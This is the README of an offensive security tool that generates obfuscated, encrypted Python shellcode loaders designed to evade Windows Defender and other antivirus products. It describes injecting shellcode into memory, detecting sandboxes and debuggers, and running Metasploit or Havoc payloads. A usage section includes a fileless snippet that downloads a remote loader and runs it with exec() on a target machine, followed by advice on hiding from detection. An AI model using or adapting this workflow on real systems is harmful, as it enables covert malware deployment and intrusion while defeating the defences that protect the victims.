### Invoke-Python-ShellCodeLoader.py
--------------------------------------
'Invoke-Python-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted shellcode loader (Python script) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Shellcode injection into the memory of the current process (Python)
  - Shellcode encryption (XOR) and compression (Zlib)
  - Script obfuscation (function and variable names are randomized + multiple encoding layer)
  - Dynamic API resolution (via GetProcAddress and LoadLibraryA)
  - Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
  - Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc

#### USAGE
- STEP 1. Generate an obfuscated shellcode loader (Python script) using a raw shellcode from your preferred C2 framework as input.
```
Example:
C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shellcode.txt" ".\obfuscated_shellcodeloader.py"
```

- STEP 2. On the target Windows machine if Python is not already installed, download the Python embeddable package which provides a signed (portable) Python interpreter with a good reputation.
```
Example:
PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
PS C:\temp> tar -xf .\python.zip
```

- STEP 3. Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Python. 
  - This fileless delivery technique enhances stealth and helps evade static antivirus detection.
```
Example:
--------
C:\temp\python> type .\Python-fileless-delivery.py

#Python3
import urllib.request
request = urllib.request.Request('http://website/obfuscated_shellcodeloader.py')
result = urllib.request.urlopen(request)
payload = result.read()
exec(payload)

C:\temp\python> python.exe .\Python-fileless-delivery.py 
```
   - Alternatively, you may download and store the obfuscated shellcode loader script locally on disk prior to execution with Python. The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
```
Example:
--------
C:\temp\python> python.exe .\obfuscated_shellcodeloader.py
```

#### OPSEC advice
Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
  
#### LICENSE
  - GNU General Public License v3.0
